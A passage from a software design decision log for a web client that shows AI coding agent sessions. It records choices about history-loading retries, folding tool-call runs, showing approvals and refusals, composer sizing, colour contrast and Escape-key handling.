**Measured**, real store against the live database with the tunnel gone 500 ms into a
reload: the run committed the newest three windows and stopped at `loadedFrom=1357` of
2878 — *the tail, no start, no first prompt* — and the same state persisted across four
polls. With the new schedule the identical outage completes: `requests=8, held=2856,
span=1..2856, holes=0, loadedFrom=1` in 2.5 s. An outage that never ends now spends
37.5 s and then reports `{kind: "stalled", earlier: 1856}` rather than nothing.

**The classification was not the load-bearing half, and the first version of this had
it the wrong way round.** Q3.22 retried transport failures only, arguing that an
`ApiError` is the far end *answering* so asking again gets the same answer. That
argument is refuted by its own favourable case: the identical eight-second outage
delivered as **transport** failures — the flavour it did retry — left a byte-identical
truncated transcript, because 2.5 s of schedule cannot survive any outage worth
surviving. The classification only decided which flavour of the same truncation you got.

**Why `no_tunnel` is in `meansLater` *and* in `meansMachineGone`.** They are different
questions about one answer, and both are right: stop believing this route, *and* ask
again in a moment. What is deliberately **not** retried is a state only somebody else
can change — `machine_over_limit` and `owner_disabled` need an admin, and retrying them
is a request loop with `loadingHistory` latched across it.

**A fixed table rather than full jitter**, unlike every other backoff here: it is pure,
so `webcheck` asserts the schedule and the total, and there is no herd to spread — at
most `MAX_LIVE_STREAMS` runs exist per tab. The 500 ms first step is *too early* for a
`no_tunnel` and costs one wasted request; kept anyway, because a second schedule per
error class is a second thing to keep in step and 500 ms is exactly right for a radio
handing over.

**The cost is a longer latch, and it is only acceptable because it is now visible.**
Each attempt is up to two fetches against the 15 s request timeout (`machine.request`
re-probes and replays internally), so six attempts against a black-holing relay is
minutes of `loadingHistory`. Silently that would be the same defect wearing a longer
coat; Q3.112's `loading` arm is what makes it a sentence on screen, and the two changes
are one change. It is also *fewer* requests per second than before — six requests per
~42 s where the old schedule spent three every four seconds.

**Status.** Reversed an earlier decision

#### Q3.105 — Does a run of tool calls have to be twenty rows?

**Decision.** No. `foldRuns` in `tail.ts` folds each run of consecutive tool rows
into one `GroupNode` that says what the run did and opens to the rows it replaced.

**Why.** This screen exists to answer *does anything anywhere need me*, and a turn's
worth of machinery is not an answer to it. Very few people need to see every tool
call; what they need is what the agent did to the files, with the detail one tap
away.

**A run of one is never wrapped.** Measured, 9 of 16 runs in the log hold a single
call, and a wrapper there would be a disclosure whose body is one row — the same
"worse than no disclosure" `opensToAnything` refuses one level down. It is also what
keeps a lone `tool_call` splitting a message into `before`/`[tool]`/`after`
unchanged, which is an existing assertion.

**Open is derived and a tap outranks it for good.** `null` means nobody has chosen,
and then the run decides — on whether it has finished, and on nothing else. That is
what makes the live one visible while the agent works and lets it fold itself when the
work lands, with **no dependency on any "is it working" flag**.

⚠ **A failure opened it too, for one deploy, and that was a bug.** `override` lives in
component state, so it is gone on reload, while `failed > 0` is a permanent property
of a finished run — so a group somebody deliberately collapsed came back open on
every single refresh, with nothing they could do about it. Reported from a real
session. Nothing needed opening: `1 failed` is drawn on the collapsed row, the same
"the number survives collapse" idiom as a folder's waiting count and a card's step
badge. A bare `ToolCall` still opens itself on failure, and the difference is exactly
that — it has no badge. `webcheck` pins the derived expression by reading the file,
because the rule is one line of JSX.
The three-valued state is the shape and the argument of the nullable `ultracode`
column: a boolean would make "I closed this" and "nobody has looked" one thing, so
either a group somebody collapsed reopens on the next event or the live one never
opens at all.

**The automatic fold is ordinarily the last run, which is what makes the height
change cheap — but it is not a guarantee, and the entry said it was.** Ordinarily
everything above the reader is unaffected and somebody at the bottom is re-pinned by
the follow effect. The exception is reachable: tool calls are measured to interleave
(a `tool_call` arrives before the previous call's `completed`), so a call that
finishes *after* a message has landed below it collapses a run further up and shifts
what is under it. The re-measure is an effect on `open` rather than a call in the
click handler — the difference from `ToolCall` — precisely because only one of the two
triggers is a tap, and the untapped one is the one nobody is looking at when it
fires.

**Measured.** Over every session in the log, by running `foldRuns` itself: **16 runs,
9 of them a single call, 7 folded** at sizes 2,3,3,3,3,4,11, taking 111 drawn rows to
89. The win is height rather than row count, since a card is several rows tall per
call.

⚠ An earlier version of this entry said "43 calls in 22 runs, 14 of them single", and
those were a *pre-implementation estimate* counted a different way — over raw
`tool_call` events between messages, so it ignored subagent nesting and the
`file_change` events a card now absorbs. Recorded because the numbers were quoted in
five places and every one of them was wrong in the same direction.

**Costs, all three named.** A run with an approval in the middle is two groups and a
line rather than one group — the price of Q3.106. A reader who scrolls *into* an
expanded live run and taps nothing loses what they were reading when the last call
completes, since `open` goes back to derived; any tap settles it for good, so it is
the read-without-touching path alone. And a group is keyed on its first child's seq,
so a run that gains an earlier member when history pages in is remounted and forgets
what was expanded inside it.

**What was rejected for the first of those.** Keeping a group open once it has ever
been open — that is `override` by another name and would leave every finished run
expanded, i.e. the feature off. And reading scroll position into the row, which is the
"stop following" flag `remeasure` exists instead of.

**Status.** Current

#### Q3.106 — What may a folded run never swallow?

**Decision.** A refusal, an answer nothing can classify, an unanswered request, any
question, a subagent, an orphaned failed update, and anything that is not a tool call.
Each of those **breaks** the run in two. An **approval** does fold — in document order,
with the collapsed row carrying `N approved`.

**Why an approval folds, which reverses the first version of this entry.** That version
said no permission ever folds, on the ground that a decision somebody made is not the
agent's machinery. True, and it cost more than it bought. Measured on a real codex
session (`s_d43bae82`): one approval in the middle of four calls produced a collapsed
group, a bare row and a **lone card** — because a run of one is never wrapped — and the
bare row was the one this same change had to teach to say anything at all. Reported as
"why isn't this folded, and what is that `exec-…`?", which is the honest reading of it.

What replaces it is the arrangement `failed` already uses: the number survives the
collapse. `N approved` is on the row, quieter than the failure badge because being asked
and having answered is not a thing that needs anybody's attention again. So "an approval
cannot be hidden" is kept by *counting* rather than by a row of its own, and the
transcript is one line where it was three.

**A refusal keeps its row, and that is the asymmetry.** `tail.ts` merges the request
away, so the answer is the only record that somebody said no — and unlike an approval,
that is a thing a reader may need to find later. The rule the codebase carries is
therefore "a refusal cannot be hidden", written down here because it is narrower than
what it replaced.

**Asked of `permissionDecisions` and never of `outcome`.** `outcome: "selected"` means
an option was chosen and every `reject_*` option produces it too — the defect Q3.28 is
about. So the verdict is the option's *kind*, joined by identity, and all three unknown
cases (no match, no map, a cancelled sweep) fall through to **not foldable**: the failure
mode is a visible row rather than a hidden refusal. The map is threaded from `EventList`,
which already memoises it on the same events array, so the fold costs no extra walk.

**A run of approvals and nothing else is not a run.** There is no work for them to fold
into and the sentence would have no clause, so they are emitted as the rows they were.

**Status.** Reversed an earlier decision

#### Q3.107 — What does a folded run say, and why can it not use the model's words?

**Decision.** A mechanical sentence: clauses derived from ACP's `kind`, in the order
each kind first appeared, joined with `", "`, capitalised, clipped at
`SUMMARY_CHARS`, with `+N −M` drawn in colour beside it rather than baked into the
string. "Ran 2 commands, edited README.md". Edits count **files**, not calls, so a
`MultiEdit` touching three of them says three.

**Why not the model's words.** They arrive as `rawInput.description`, which is on
**13 of 1132 updates** in the log — practically every claude `Bash` call and not one
edit. So half a transcript would speak in the model's voice and half in ours,
differing by agent, which is worse than one grammar that is always the same. The
model's own words are still on the rows inside, where they were written.

**From `kind` and never from a title or an id**, the rule the rest of this client
follows for every control it draws. Two defects were found by running the grammar
over the real log rather than over fixtures, and both are pinned: `ToolSearch`
arrives as `kind: "other"` with `rawInput.query = "select:AskUserQuestion"`, and
naming an unknown kind by its *summary* put that string into a sentence — an
argument is not a name, so an unknown kind is named by its tool. And a nameless
single call produced **"used 1 tools"**, which reads as a broken product rather than
a missing plural.

**The sentence is not on the node.** `RunTally` carries numbers and at most one name
per clause, and `runSummary` is called at the row. Putting the finished string on the
node would allocate one string per group per rebuild, which is the exact cost
`sameNode` exists to avoid.

**Status.** Current

#### Q3.108 — One edit, two events. Which one is drawn?

**Decision.** The `diff` one, inside the card that made it. The `fs_write` twin is
dropped in `placeNodes` when an edit to **the same path** has already been spoken
for — one credit per absorbed change, spent once.

**Why.** Q6.12 measured it: a kimi edit produces `source: "diff"` carrying the tool
call's id and then `source: "fs_write"` with `toolCallId: null`. The first is folded
into the card; the second has no call to fold into and would stand underneath it as
the same edit again. Before this change both were drawn as bare paths, so the
duplication was there and merely looked like two paths.

⚠ **The first version of this matched on content and could never fire.** It keyed on
the path plus `newText`'s length and opening — and the two halves do not carry the
same text: the `diff` copy is the *fragment* the model typed (Q7.29: `"two"` →
`"TWO CHANGED"`), while `onWriteTextFile` reads the file from disk and sends the
**whole** of it either side (`src/session.ts`). So no signature ever matched, and
because each half now draws a diff, the outcome was **worse than the two bare paths
it replaced**: one edit reported twice, with two different `+N −M`. Three places
claimed it was fixed. What made it survive review is that the driver's own fixture
fed identical text down both channels, which is not a shape kimi produces — a fixture
asserting the rule's *statement* rather than its subject.

**One credit per absorbed edit, not a set.** "This path is dealt with" would suppress
a genuinely later write to a file edited earlier, and that row is the only trace of
it. A credit is spent once, so the pair collapses and a second write keeps its row.

**One direction only.** An `fs_write` change is dropped when a `diff` change spoke
for the file, never the reverse, and never `fs_write` against `fs_write`. What is
lost is the better data — whole-file text diffs more legibly than a fragment — and it
is lost deliberately: the card is where an edit belongs, and the fragment is what the
card's own call produced.

**Where it is decided.** In `placeNodes`, which runs **forwards**, so the card is
placed and its credit exists before either change node arrives. `nodeFor` builds a
`ChangeNode` for every `file_change` including the ones a card will absorb, for the
reason an `UpdateNode` is built the same way: the walk is backwards, so whether the
call is inside the window is not yet knowable when the change is met.

**Unexercised by the local log**, which is why this needed reading rather than
running: all 15 `file_change` rows there are `source: "diff"` and not one is
`fs_write`. The path is kimi's alone.

**Status.** Current

#### Q3.400 — Should there be a button that inserts a newline?

**Decision.** No. There was a `↵` button beside the composer and it is deleted.
Enter is the newline on a coarse pointer, and `composerKey` is what decides that.

**Why.** It appended `\n` to the *end* of the draft, with `caret` sitting one field
away unread, so it did not insert a newline where somebody was typing — it appended
one somewhere else. And it took 44px out of the box you are typing in, on the
narrowest screen this runs on. Both halves are worse on a phone, which is the only
device where a newline button would have a job at all.

**Status.** Current

#### Q3.401 — Why is `showsCaption` a rule about the category rather than a breakpoint?

**Decision.** A chip says its own name only where the value does not, decided per
category by `showsCaption` — `false` for exactly `model` and `thought_level`.

**Why.** Those two are identified twice over without a caption: a category icon, and
a value that is a proper noun ("Opus 5", "Adaptive"). `mode` keeps its name at every
width because "Manual" alone says nothing, and an **unknown** category keeps its own
because `CATEGORY_ICON` has no entry for it — a chip with neither icon nor caption
is a bare value, in the `…` popover where there is no position to read it by either.

**Rejected.** `hidden sm:inline`, i.e. a width question answered with a breakpoint.
It got the answer exactly backwards at both ends: the caption vanished on a phone
for the control that needed it, and came back on a desktop for the ones that did
not.

**Status.** Reversed an earlier decision

#### Q3.402 — Should a chip reserve the width of what *this* agent published?

**Decision.** No. `chipReserve` returns **one list per category**, not the agent's
own labels, and those strings are rendered invisibly in one grid cell so the column
is sized by the real font rather than by a `length` guess.

**Why.** The right-hand cluster is right-aligned, so a chip that grows drags
everything left of it. Reserving what this agent published made claude's effort chip
wider than kimi's, so the same strip was a different shape per session and moving
between two sessions moved every button — the one thing this row must not do. The
strings are the longest *ordinary* value, so a rare longer one truncates with the
full text in the menu and the `title`; `null` for an unknown category, which is
drawn in the overflow popover where every chip is on its own row with nothing beside
it to move.

**Measured.** The reserved strings are `Accept Edits`, `GPT-5.6-Sol` and `Adaptive`,
each beside `—`.

**Status.** Current

#### Q3.403 — Why are the width sizers `hidden sm:block`?

**Decision.** Below `sm` the sizers leave the layout entirely and chips size to
their content, truncating under pressure as they always did. Above it there is room
and no width depends on what anything says.

**Why.** Space rather than taste.

**Measured.** All three reservations at once are ~510px of strip against a 390px
phone.

**Status.** Current

#### Q3.404 — How does a control that the agent stopped offering keep its slot?

**Decision.** `Absent` draws that slot from `chipParts` and `chipInner` — the same
two calls the live chip makes — and never from markup of its own.

**Why.** That is the whole of "a button does not move": `caption` and `reserve` do
not depend on availability, so the only thing that changes is the string inside a
box already sized for it. Written out a second time the two drifted immediately —
the first version drew the control's name where the live chip deliberately does not,
so choosing Haiku widened that chip by a word and a gap and shoved the cluster
sideways, which is the exact failure `drawnControls` and `unavailable` exist to
prevent.

**Status.** Current

#### Q3.405 — Why does the strip hold controls an agent is no longer publishing?

**Decision.** `holdConfig` in `store.ts` keeps the last set a **running** agent
published, `drawnControls` chooses between the live answer and that memory, and
`stale` makes the memory readable but not tappable.

**Why.** The daemon drops `agentConfig` with the agent — correctly, those describe
what an agent will accept *right now* — so for the length of every restart,
auto-resume and ultracode change the composer's whole row of controls blinked out of
existence. That is once per deploy, on every open session. The live agent always
wins **including when it publishes nothing**, which is the arm that does the work:
without `hasLiveAgent` telling an agent with no controls from a session with no
agent, a dead set of chips would be pinned to a running session for ever.

**Why the context ring is not held.** A dead agent's window occupancy is not a fact
about anything, and the ring already says "cannot tell".

**Status.** Current

#### Q3.406 — What does it cost when `wire.ts` falls behind `src/events.ts`?

**Decision.** `webcheck` reads `src/events.ts` off disk and compares both halves —
the `ExitReason` union and `DAEMON_EXIT_REASONS` — rather than trusting the next
person to remember.

**Why.** `config_changed` was added to the daemon's `ExitReason` and not to the
client's hand-mirrored copy, so a session the daemon was restarting on purpose fell
out of `waitingForDaemon` into `showsAsEnded` — which takes the **whole composer**
off the screen, the one outcome that partition exists to make impossible for a
conversation that is coming back. Every existing assertion stayed green, because
they all read the same wrong copy. A hand-mirrored copy is only worth having while
it *is* the copy.

**Status.** Current

#### Q3.407 — Which status tone gets the loud blink?

**Decision.** `running` and nothing else. `starting` takes the hollow pulse, which
is what `waiting` already is.

**Why.** `starting` wore `running`'s `animate-blink` while `TONE_DOT`'s own comments
reserved it twice over, so an agent restarted for a settings change announced for
about a second that an idle session was working. The hollow pulse is the same
sentence read from the live side — an agent is being put in front of this
conversation, nobody is deciding anything, and nothing is being asked of you.
`webcheck` asserts the rule over the whole table rather than the entry, by reading
`bits.tsx` off disk.

**Status.** Current

#### Q3.408 — Where is an outstanding config choice recorded?

**Decision.** In `choices.ts`, written by `applyConfigChange` and by nothing else.
`withChoice` overrides the drawn value out of it.

**Why.** **There are two doors into that function** — the strip's chip and the
composer's `/effort` menu — and for one revision the override lived in the config
bar's own `useState`, so the slash menu was left drawing the daemon's value with
nothing on screen acknowledging the choice. That file's own docblock had already
predicted it ("a second copy of this is a second place for that to be forgotten")
about the sibling rule. `webcheck` pins it as a **call-site** property — recorded
and released exactly once, both inside the dispatcher, with `Composer.tsx` writing
neither while still being a second caller — because every pure assertion passed
while the defect was live.

**Status.** Current

#### Q3.409 — Does a config change draw a spinner while it is in flight?

**Decision.** No. There is no spinner on the strip, and that is the whole of
"optimistic": `withChoice` puts the chosen value on the chip before the request
leaves, and a refusal snaps it back to the truth beside a toast, out of
`applyConfigChange`'s `finally`.

**Why.** What a spinner reported is now the one thing this row is not — the value
somebody chose is already on the chip, and the daemon no longer publishes the fresh
agent's own controls mid-restart, so from the outside a restart looks like the
change simply happening, which is what it is. Optimism here is bounded by a
retraction, the same bar the transcript's own optimism rules set. It is **not** the
optimism `Composer`'s Stop control refuses, since nothing is being claimed about
what the *agent* is doing.

**Rejected.** A spinner behind a 250ms delay, on the argument that an ordinary
`set_config_option` answers in tens of milliseconds while a change that restarts the
agent runs into seconds and should still report itself. Both halves were true and
the conclusion is withdrawn. ⚠ The rules prose described that spinner and named a
`SPINNER_AFTER_MS` constant that does not exist in the code; the sentence is
corrected rather than left standing.

**Status.** Reversed an earlier decision

#### Q3.410 — When may a model chip draw the description instead of the name?

**Decision.** Only where a separator says the head *is* the model — `chipValue`
mines `Opus 5 · Best for…` and nothing else.

**Why.** The whole reason it exists is claude's `Default (recommended)`, which names
no model. Without a separator the description is a sentence, however short, and a
length guard does not tell a sentence from a name.

**Measured.** codex's 37-character "Latest frontier agentic coding model." passed a
length guard and put itself on the chip while `GPT-5.6-Sol` sat one field away.

**Status.** Current

#### Q3.411 — Do `labelFor` and `choiceOverride` answer the same question?

**Decision.** No, and they get opposite answers. `labelFor` reconciles two agents'
words for one *control* (claude `Effort`, kimi `Thinking`); `choiceOverride`
reconciles two agents' words for one *choice*, returning a label **and** a
description for effort but only a description for mode.

**Why.** kimi *did* say what its mode means, so the fix for "Default says nothing"
there is the caption rather than the name. Renaming a choice the agent worded for
itself would be this client editing what an agent offered.

**Status.** Current

#### Q3.412 — Should a control that is waiting on a round trip be dimmed?

**Decision.** No. The exclusion is `locked` — inert and undimmed. `disabled` stays
the semantic one, meaning no agent to ask or a prompt in flight, and is the only one
that fades.

**Why.** One tap used to disable every control in the row, and `opacity` is
deliberately absent from `.tap`'s transition list, so the whole strip snapped to 40%
and snapped back around a round trip that is often under a second — while the
paperclip and the context ring, which take no such flag, stayed at full strength,
making the row read as broken rather than busy. The exclusion itself is worth
keeping: setting a model rebuilds the mode list, so two changes at once really do
race, and the daemon refuses a config change mid-restart on purpose. The cost is a
second or two in which a tap on another chip does nothing at all, taken
deliberately.

**Status.** Current

#### Q3.413 — Why is the IME guard not optional, and why does `completionKey` carry its own?

**Rule.** Every Enter reader in `keys.ts` guards on composition — `shouldSend` and
`completionKey` both, rather than one relying on running before the other.

**Why.** With a Russian, Chinese, Japanese or Korean input method Enter commits the
candidate being typed, so a bare `key === "Enter"` sends a half-finished word —
invisibly, from a Latin keyboard, which is why it survives review. `composerKey`
resolves the ordering between the two readers, but ordering is not a guard: the
menu's own reader has to refuse a composing Enter on its own account.

**Status.** Current

#### Q3.414 — Why does the composer's focus ring need `.no-focus-ring`?

**Behaviour.** `outline-none` does **not** remove it, and appears to. Tailwind emits
utilities inside `@layer utilities`, and **unlayered styles beat layered ones
regardless of specificity** — so the browser's own focus ring, declared unlayered,
wins against a utility class however specific.

**Why.** The opt-out is `.no-focus-ring`, declared by the rule itself inside
`:where()`, which is what keeps it at zero specificity and therefore overridable in
the ordinary direction. The box is meant to look the same focused and not.

**Status.** Current

#### Q3.422 — The composer grew to the size of the screen. Why was it unbounded, and what bounds it now?

**Decision.** `fitToContent` in `Composer.tsx` clamps the box to
`COMPOSER_MAX_SHARE` (0.22) of `visualViewport.height`, and switches `overflow-y`
to `auto` at the cap and back to `hidden` below it. A second, mount-only effect
re-applies it on `resize` — on `window` *and* on `visualViewport`.

**Why it was unbounded.** A `min(scrollHeight, 40vh)` clamp with a `max-h-[40vh]`
to match was removed deliberately: past about a dozen lines the box became a small
window with a scrollbar down its edge, so you were writing into a viewport rather
than at a page. The removal wrote its own cost down — "a genuinely huge paste makes
the composer taller than the viewport, and the column has nowhere to put the
overflow" — and that is what was reported from a phone, so this reverses a decision
on the evidence its own author asked for.

**Measured**, at 390×844 with the app's real stylesheet, 40 lines of text: the box
was **1780px, 211% of the viewport**, with the bar's bottom edge at 1819 — i.e. the
Send button 975px below the screen — and the transcript squeezed to its 16px floor.
At 12 lines it was already 65%. Capped, all three of 12, 40 and 200 lines resolve to
186px, the bar stays on screen, and the transcript keeps 635px.

**The share is 0.22 and was 0.4 for one deploy.** 0.4 is the largest share that
still leaves the conversation the majority of the screen, which is a defensible
number and not the one that felt right once it was running; it was lowered by 45%
on request. Measured at `text-sm`'s 22px line: seven lines on a 390×844 phone, four
with the keyboard up, three in a 416px-tall desktop window, nine at 1000px — the
last two being why this is a share and not a line count.

**Why `visualViewport` and not `vh`.** A software keyboard covers the layout
viewport without shrinking it, so the old `40vh` was 337px of a page with ~508px
visible — a cap that still resolves to most of the screen, which is the complaint.
Measured against a 508px visible viewport: 112px capped, 373px left for the
conversation. CSS has no unit for this, which is why the bound is arithmetic in a
function rather than a `max-h-[…]` utility, and why the resize listener has to be
on `visualViewport` — `window` does not fire for the keyboard.

**Status.** Reversed an earlier decision

#### Q3.200 — Once machines became a tab bar, where does a blocked session on another machine appear?

**Rule.** In `waitingFloor`, in `groups.ts`, computed by **subtraction** —
everything blocked in the fleet, minus everything this view can draw. It ignores
the filter and the needle deliberately. `webcheck` asserts it as a **superset
property** over every filter × every tab × a set of queries.

**Why.** Machines used to be sections in one scroll; as tabs, only one machine's
chats are on screen at a time, so a blocked session on any other machine has no
row at all — and the tab carrying its count can itself be scrolled off the end of
the bar. That is a strictly new hole in "an approval cannot be hidden", the one
failure this screen exists to prevent. Subtraction is what makes the closure
structural: a new section, a new filter or a new needle cannot open a gap in it by
accident, because anything a view learns to draw leaves the floor by construction.
A filter is a slice you asked for, and being asked for an approval is not
something you can ask to stop, so the floor ignores both controls.

**Measured.** The superset property earned itself immediately: the first version
computed reachability *without* the needle, so four letters typed into the search
box hid an approval — which no amount of reading had caught.

**Status.** Current

#### Q3.201 — Which screens owe the waiting count, now that Settings is a pop-up?

**Rule.** Anything that covers the fleet view. The badge lives in `Sheet`, which
**reads the store itself rather than taking a prop**, and `/new/:machineId` owes
one too.

**Why.** This rule used to read "the settings rail owes it", because `SettingsNav`
*replaced* `SessionBrowser` in the aside and a wide screen left on Settings made
every blocked row invisible. Settings is a pop-up now, so the rail is never
replaced — it is covered, by a scrim on a desktop and by 92dvh of sheet on a
phone. The obligation is unchanged and only its reason moved. Reading the store
rather than taking a prop is what keeps it from being a convention the third
caller forgets, and `/new/:machineId` is exactly that third caller: it never had
the count, and it holds the whole screen for up to 45 seconds while `POST
/sessions` starts an agent.

**Status.** Reversed by Q3.434 — the badge is gone. The obligation this entry
states was discharged by the *pop-up* rather than by the badge: covering the rail
with a scrim is not replacing it.

#### Q3.202 — Where does the rail say a machine is unreachable?

**Position.** Nowhere. `MachineTabs` draws `name` and `blockedCount` only, so
`machineSubline` and `MachineTab.reach` have no caller outside `webcheck`.
Settings → Machines and the New session picker are the only places reachability is
shown.

**Why.** `machineSubline` keeps `blocked` above `offline` deliberately, and the
compensation that once made that free is gone: the precedence used to be defended
with "the header's own `Dot` still says offline beside it, so nothing is lost",
and there is no machine header any more. The precedence itself is still right — a
hidden approval is the one failure this screen exists to prevent, and an
unreachable machine is a lesser one — but nothing now carries the lesser fact at
all. Written down because four rules in a row about visibility read as coverage,
and this is the kind of gap that gets rediscovered as a bug.

**Status.** Known limitation

#### Q3.203 — Does the reserved scrollbar gutter belong on all three boxes?

**Decision.** On one: the transcript. The rail and `AppShell`'s content pane are
exceptions and neither may take it back. This reverses the three-box answer.

**Why.** The rule is still that `scrollbar-width: thin` takes layout width, so
crossing the fit threshold moves everything *centred* by half of it while nothing
left-aligned moves at all — which is a fact about the transcript and about nothing
else. In the rail the reserved strip lands immediately left of the divider, so
every row separator stopped ten pixels short of it and the column read as having
come unstuck from its own border; nothing there is centred, so what a scrollbar's
arrival moves is the right-hand edge, which is where the scrollbar then is — the
movement explains itself, which is exactly what the transcript's never did. In the
content pane the argument had been that the strip "lands against the window's own
edge and nobody can see it", and that holds only while nothing inside paints out
to that edge: the session header and the composer both do, full-bleed, with a fill
and a rule, so it showed as a header ten pixels short of the page. It was also
bought for nothing there — every route puts a `min-h-0 flex-1` column inside that
pane and owns its own scroller, so the pane never scrolls.

**Measured.** Only visible with *classic* scrollbars. A Mac left on "show scroll
bars when scrolling" reserves nothing, which is why this survived so long and why
headless Chrome cannot reproduce it.

**Status.** Reversed an earlier decision

#### Q3.204 — Why did the chat read as the colour of the menu?

**Decision.** The content pane paints `bg-surface` and the rail paints `bg-ink`,
both explicitly; neither may fall through to `body`.

**Why.** `main` carried no background at all, so the conversation fell through to
`body`'s `--color-ink` — the *same value* the rail paints with — while `border-r`
had already been deleted on the strength of a tonal step that therefore did not
exist. Three separate reports were that one omission: the chat was the colour of
the menu, the header stopped short (the gutter above showed ink beside the
header's surface), and the transcript's tones were inverted, with a tool card on
`bg-surface` reading as the brightest object on screen.

**Status.** Current

#### Q3.205 — How much colour is in the palette, and where is it spent?

**Decision.** Chroma across all three surfaces is 0.003–0.006 in OKLCH; `surface`
is plain `#ffffff`. `bg-raised` is the message you wrote at 1.22:1 and
`bg-raised/50` at 1.10:1 is a plan, the panel a wizard sits in, and a well inside
an expanded row. `ink` is the rail at 1.06:1 from the pane and is not a tonal step
anything in the conversation may be built on. A control is drawn in the colour of
what it sits on and identified by `--color-edge-strong` alone, which is why that
token carries a ≥3:1 floor.

**Why.** Enough chroma that the app is not clinical, far too little to read as
beige. The exceptions to the ground rule are values you must read once — the
one-time secret and the device code — and they take a real fill.

**Rejected.** The middle version of this palette pushed `ink` to 0.026 to separate
the panes by colourfulness, and read as beige. There were three fill exceptions
rather than two: the workspace warning was the third, and it went with the banner
that carried it.

**Status.** Current

#### Q3.206 — Does a tool call get a fill in the transcript?

**Decision.** No fill at all. A tool call is a bare row, like the folded run it
sits beside. This reverses "two grades of one token, the quiet one for machinery".

**Why.** A folded run is a bare row and a run of one is never wrapped, so a filled
card next to a group row was two shapes for one idea, differing by *arity*. What
stays filled is what is worth filling — the message you wrote, a plan, a wizard's
panel, a well inside an expanded row.

**Status.** Reversed an earlier decision

#### Q3.207 — What colour and weight does a machinery row get?

**Decision.** `text-fg/85`, one value for every machinery row, **failures
included**. A failure is carried by the `X` at full `fg` and by a folded run's `N
failed`, never by weight. A permission row is padded and reserves the kind-glyph
slot empty.

**Why.** A tool row inherited `fg`, i.e. the agent's own prose value, so with no
frame it read as part of the sentence above it. A semibold failed title, inherited
by a folded run's summary, made the loudest text on screen the row a reader least
needs. The permission row had been sitting a glyph left of its siblings, which
matters now that it folds into a run.

**Measured.** 10.99:1 on the pane, against prose's 17.37 and `muted`'s 7.75 — a
step between the two.

**Status.** Current

#### Q3.208 — Why is a title clipped in code rather than by `truncate`?

**Decision.** `TITLE_CHARS` 80 with `TITLE_OVERFLOW_MIN` 20, and the body opens to
the title in full. `headlineWorthDrawing` is the same judgement one field over: a
value whose opening 24 characters already appear in the title is an echo of it and
is not drawn.

**Why.** `truncate` answers "does it fit" and throws away "was anything cut",
which is what decides whether a card can be opened at all — a card that opens onto
a body saying less than its own row is worse than one that does not open.
`headlineWorthDrawing` catches `Read file '<path>'` beside the path and the query
codex truncates with a literal ` ...`, and keeps `Bash` beside `npm test`.

**Measured.** codex's web search is titled with every query it ran — 161
characters — while `rawInput.query` is a truncated copy of the first. Over the
whole database, 80/20 clips the two payload titles and leaves the 82/82/87 near
misses whole, where a flat cut spent a line to reveal two characters.

**Status.** Current

#### Q3.209 — What may wear `bg-fg`?

**Decision.** The affirmative action inside a decision, and nothing else: Send,
and the reversible approval on the ask card. `raised` means **state** — a tab you
are on, a toggle that is on, a menu row that is chosen.

**Why.** `bg-fg` is a near-black block in a palette whose three greys sit within
1.22:1 of each other, so anything else wearing it becomes the loudest object on
the screen. The selected machine tab and the New session button both wore it,
permanently, for a selection and a navigation; both are `raised`/`plain` now, with
weight and a leading glyph carrying them — the same substitution a blocked row's
title makes.

**Status.** Current

#### Q3.210 — Does the rail keep its `border-r`?

**Decision.** The rule is the ratio, not the line. Below roughly 1.15:1 a line
does the dividing and the tone only supports it; at 1.06:1 two panes with no line
between them read as one pane.

**Why.** It has now been argued both ways. `border-r` was deleted when the
division was supposed to come from a tonal step — false while `main` painted
nothing (Q3.204), and true for one revision at 1.18:1.

**Status.** Current

#### Q3.211 — What does the magnifier in the rail header do?

**Decision.** Nothing, and it is drawn `disabled` rather than doing nothing
silently. The box below it filters *this machine's* chats by title; the icon is
the fleet-wide search, which is not built.

**Why.** It was briefly wired to focus the box below — a shortcut to something
already on screen, and a conflation of two different questions. Drawing it
disabled is the distinction the bell beside it earns by being a real number and a
real destination.

**Status.** Not built

#### Q3.212 — What is the session list's default filter?

**Decision.** `"active"`, and it may only be narrowed while some control can widen
it again. The icon beside the search box is a live `Dropdown` on `setFilter`.

**Why.** This filter is the **only** route to an ended session anywhere in the
app. It went `"active"` → `"all"` → `"active"`, and the middle step was not a
preference: for one revision the icon was drawn as an inert placeholder, and a
narrow default behind a dead control puts every finished conversation permanently
out of reach. If the control is ever reverted to a placeholder, `groups.ts`'s
initialiser and `webcheck`'s assertion go back to `"all"` in the same commit.

**Status.** Current

#### Q3.213 — Does a route-backed pop-up need a back button?

**Decision.** No. A screen's leading control is a close to a fixed destination; a
sheet's ✕ goes to the path `history.state` recorded when it opened (`useUnder`)
and its ◀ to `settingsUp(route)`, both derived from the URL rather than from a
history. Inside an overlay, anything that moves you shallower uses `replace` and
anything deeper uses `push`.

**Why.** `history.back()` went wherever you happened to have been (Q3.17), and a
pop-up does not change that. Android's Back **is** a history control and needs no
code at all: the pop-up is a real route, so Back pops the entry that opened it and
the sheet unmounts. That is the whole payoff of keeping these as URLs, and it is
why `Header.closeTo` and `close="always"` could be deleted rather than
generalised.

**Status.** Current

#### Q3.214 — Does this app have a modal, and who owns Escape?

**Decision.** It has modals, and there is a single arbiter: `ui/overlay.ts` holds
a LIFO stack of dismissible layers and one capture-phase listener, with `AskCard`,
`Dropdown`, `SessionMenu` and `Sheet` as registered participants. Typing beats
every layer (`isTypingInto`); otherwise the most recently opened layer owns Escape
and stops propagation, with `stop === (dismiss !== null)` asserted over every
generated stack.

**Why.** "This app has no modal" was true, and the objection it rested on was
that inventing one would put a second dismissal mechanism up against `AskCard`'s —
the one thing on screen that must never argue about who owns Escape. A single
arbiter answers the objection rather than ignoring it: **three** ad-hoc `window`
Escape bindings became one, `AskCard`'s capture-phase binding and
`Dropdown`/`SessionMenu`'s bubble-phase pair. The `stop === (dismiss !== null)`
assertion exists because the failure being replaced was a component that stopped
propagation *before* deciding whether it would act, ending the dispatch for
everybody and cancelling a tool call while leaving the menu it was aimed at open.
Two things then fall out with no code: a menu inside a sheet takes Escape first
and the sheet takes the second, and a sheet opening over a parked question closes
itself and leaves the card exactly as it was, where the old arrangement folded a
card nobody could see.

**Correction.** The old list named five bindings to collapse; two of them never
were. `keyboard.ts` still binds Escape on `window` by design — it acts only where
the arbiter has not claimed the key — and `Composer`'s menu is an element handler
on the textarea.

**Status.** Reversed an earlier decision

#### Q3.215 — Why are there two bare-letter guards rather than one?

**Rule.** `shortcutsEnabled` blocks only a `sheet`; `decisionShortcutsEnabled`
blocks every layer **except the card's own `ask`**.

